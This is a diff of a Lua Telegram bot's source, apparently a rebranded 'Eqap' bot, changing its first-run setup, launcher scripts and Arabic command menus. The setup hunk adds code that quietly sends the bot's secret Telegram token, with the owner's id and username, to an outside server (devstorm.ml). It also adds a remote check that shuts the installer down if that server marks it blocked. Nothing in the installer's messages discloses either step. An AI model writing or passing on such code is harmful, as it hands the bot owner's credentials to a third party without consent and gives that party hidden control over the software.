@@ -11,15 +11,17 @@ local function Load_File()
 local f = io.open("./Info_Sudo.lua", "r")  
 if not f then   
 if not redis:get(Server_Devid.."Token_Devbot") then
-io.write('\n\27[1;35m⬇Send Token For Bot : ارسل توكن البوت ...\n\27[0;39;49m')
+io.write('\n\27[1;35mSend Token For Bot : ارسل توكن البوت ...\n\27[0;39;49m')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
+local User_Info_bot = JSON.decode(url) 
 if res ~= 200 then
 io.write('\n\27[1;31mToken Is Communication Error\n التوكن غلط جرب مره اخره \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m• Done Save Token : تم حفظ التوكن \n\27[0;39;49m')
 redis:set(Server_Devid.."Token_Devbot",token)
+redis:set(Server_Devid.."Token_Devbotuser",User_Info_bot.result.username)
 end 
 else
 io.write('\n\27[1;31mToken was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
@@ -28,27 +30,34 @@ os.execute('lua Eqap.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 if not redis:get(Server_Devid.."User_Devbots1") then
-io.write('\n\27[1;35m⬇Send UserName For Sudo : ارسل معرف Carbon ...\n\27[0;39;49m')
-local User_Sudo = io.read()
+io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف Carbon ...\n\27[0;39;49m')
+local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
+local GetInfoUser = https.request("https://devstorm.ml/api/source/?id="..User_Sudo)
+local User_Info = JSON.decode(GetInfoUser) 
+if User_Info.Info.Chek == "is_block" then
+io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
+os.exit()
+end
+if User_Info.Info.Chek == "Not_Info" then
+io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
+os.execute('lua Eqap.lua')
+end
+if User_Info.Info == 'Channel' then
+io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
+os.execute('lua Eqap.lua')
+end
 io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف Commander  واستخراج ايدي Commander \n\27[0;39;49m')
-redis:set(Server_Devid.."User_Devbots1",User_Sudo)
+print(User_Info.Info.Username,User_Info.Info.Id)
+redis:set(Server_Devid.."User_Devbots1",User_Info.Info.Username)
+redis:set(Server_Devid.."Id_Devbotsid",User_Info.Info.Id)
+https.request("https://devstorm.ml/api/insert/?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..redis:get(Server_Devid.."Token_Devbot"))
 else
 io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
 end 
 os.execute('lua Eqap.lua')
 end
-if not redis:get(Server_Devid.."Id_Devbotsid") then
-io.write('\n\27[1;35m⬇Send id For Sudo : ارسل ايدي Carbon ...\n\27[0;39;49m')
-local User_Sudo = io.read()
-if User_Sudo ~= '' then
-io.write('\n\27[1;31m• The id Is Saved : تم حفظ ايدي Commander  واستخراج ايدي Commander \n\27[0;39;49m')
-redis:set(Server_Devid.."Id_Devbotsid",User_Sudo)
-else
-io.write('\n\27[1;31mThe id was not Saved : لم يتم حفظ ايدي Carbon\n\27[0;39;49m')
-end 
-os.execute('lua Eqap.lua')
-end
+
 ------------------------------------------------------------------------------------------------------------
 local Dev_Info_Sudo = io.open("Info_Sudo.lua", 'w')
 Dev_Info_Sudo:write([[
@@ -67,7 +76,8 @@ Dev_Info_Sudo:close()
 local Run_File_Eqap = io.open("Eqap", 'w')
 Run_File_Eqap:write([[
 #!/usr/bin/env bash
-cd $HOME/Eqap
+cd $HOME/]]..redis:get(Server_Devid.."Token_Devbotuser")..[[
+
 token="]]..redis:get(Server_Devid.."Token_Devbot")..[["
 while(true) do
 rm -fr ../.telegram-cli
@@ -79,19 +89,27 @@ Run_File_Eqap:close()
 local Run_SM = io.open("NG", 'w')
 Run_SM:write([[
 #!/usr/bin/env bash
-cd $HOME/Eqap
+cd $HOME/]]..redis:get(Server_Devid.."Token_Devbotuser")..[[
+
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Eqap -X kill
-screen -S Eqap ./Eqap
+screen -S ]]..redis:get(Server_Devid.."Token_Devbotuser")..[[ -X kill
+
+screen -S ]]..redis:get(Server_Devid.."Token_Devbotuser")..[[ ./Eqap
+
 done
 ]])
 Run_SM:close()
-io.popen("mkdir Files")
-os.execute('chmod +x tg')
-os.execute('chmod +x NG')
-os.execute('chmod +x Eqap')
-os.execute('./NG')
+local CmdRun =[[
+chmod +x tg
+chmod +x Eqap
+chmod +x ./NG
+cp -a ../Eqap ../]]..redis:get(Server_Devid.."Token_Devbotuser")..[[ &&
+rm -fr ~/Eqap
+../]]..redis:get(Server_Devid.."Token_Devbotuser")..[[/NG
+]]
+os.execute(CmdRun)
+
 Status = true
 else   
 f:close()  
@@ -6781,6 +6799,8 @@ send(msg.chat_id_, msg.id_,[[
 • `#game` » عدد النقاط
 • `#AddMem` » عدد الجهات
 • `#Description` » تعليق الصوره
+-
+شكل الايدي : @JOQOS .
 ]])
 return false  
 end 
@@ -7651,11 +7671,7 @@ return false end
 end
 if text == 'السورس' or text == 'سورس' then
 Text = [[
-⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤   
-[✾┆eqab](http://t.me/r03_1) 
- 
-[✾┆eqab source](http://t.me/eqabsource) 
-⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤
+- [Alex source](t.me/Alexxsource) .
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -8148,6 +8164,8 @@ local Text= [[
 ▹ `#stast` - ܁ رتبة المستخدم
 ▹ `#edit` - ܁ عدد تعديلات 
 ▹ `#game` - ܁ نقاط
+-
+شكل الايدي : @JOQOS .
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false  
@@ -8173,7 +8191,7 @@ redis:del(bot_id.."KLISH:ID:bot")
 send(msg.chat_id_, msg.id_, '܁ تم ازالة كليشة الايدي ')
 return false  
 end 
-if text == 'الاوامر' or text == 'اوامر' or text == 'الأوامر' then
+if text == 'الاوامر' or text == 'اوامر' or text == 'الأوامر' or text == 'الاعدادات' then
 if Admin(msg) then
 local Text =[[
 *• اوامر المجموعه*
@@ -8702,7 +8720,7 @@ if text == 'حذف شكل السورس' and Dev_Bots(msg) then
 
 redis:del(bot_id..'Eqap:new:sourse1')
 redis:del(bot_id..'Eqap:new:sourse2')
-send(msg.chat_id_, msg.id_, 'تم حظف تغير شكل السورس')
+send(msg.chat_id_, msg.id_, 'تم حفظ تغير شكل السورس')
 end
 if text == 'كشف المجموعه' and Owner(msg) then
 
